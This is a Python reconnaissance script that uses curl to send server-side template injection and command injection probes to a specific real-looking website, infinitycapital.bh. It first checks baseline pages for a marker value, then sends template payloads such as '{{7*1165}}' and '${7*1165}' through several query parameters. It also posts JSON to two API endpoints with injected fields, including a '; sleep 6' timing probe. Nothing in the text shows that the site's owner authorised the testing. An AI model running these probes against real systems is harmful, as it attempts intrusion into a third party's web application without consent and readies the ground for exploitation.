import subprocess, urllib.parse, re
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36"
def req(url, hdrs=None, data=None, timeout=30, out="/tmp/m.bin"):
    c=["curl","-s","-m",str(timeout),"-A",UA,"-o",out,"-w","%{http_code}|%{size_download}|%{time_total}"]
    for h in (hdrs or []): c+=["-H",h]
    if data: c+=["--data-binary",data]
    c.append(url)
    r=subprocess.run(c,capture_output=True,text=True)
    try: body=open(out,"rb").read()
    except: body=b""
    return r.stdout, body
def esc(p): return urllib.parse.quote(p,safe='')

# unique markers unlikely to appear naturally
MARK = "8135"   # 7*1165
print("### control: does marker appear in BASELINE pages?")
for name,url in [("home","https://www.infinitycapital.bh/?page=2"),
                 ("contact","https://www.infinitycapital.bh/contact?cb=1"),
                 ("404","https://www.infinitycapital.bh/404")]:
    o,b=req(url); print("  %-8s %s marker_in_baseline=%s"%(name,o,MARK.encode() in b))

print("\n### SSTI unique-marker test (expect 7*1165 = 8135)")
payloads=["{{7*1165}}","${7*1165}","<%= 7*1165 %>","#{7*1165}","{{7*'1165'}}","${{7*1165}}",
          "{{-7*-1165-}}","{{ 7*1165 }}","{% for i in range(8135) %}{% endfor %}","{{7*1165}}{{7*1165}}"]
for base in ["https://www.infinitycapital.bh/?page=","https://www.infinitycapital.bh/contact?cb=","https://www.infinitycapital.bh/?id=","https://www.infinitycapital.bh/404?q="]:
    print(" target",base)
    for p in payloads:
        o,b=req(base+esc(p))
        cnt=b.count(MARK.encode())
        print("   %-40s %s marker_count=%d"%(p[:38],o,cnt))

print("\n### POST /api/send - SSTI/CMDi in JSON body fields")
body='{"to":"a@b.com","name":"{{7*1165}}","subject":"${7*1165}","message":"; sleep 6","targets":["a@b.com"]}'
o,b=req("https://www.infinitycapital.bh/api/send",data=body,hdrs=["Content-Type: application/json"])
print("  json:",o,b[:200])
o,b=req("https://www.infinitycapital.bh/api/contact",data=body,hdrs=["Content-Type: application/json"])
print("  contact:",o,b[:200])
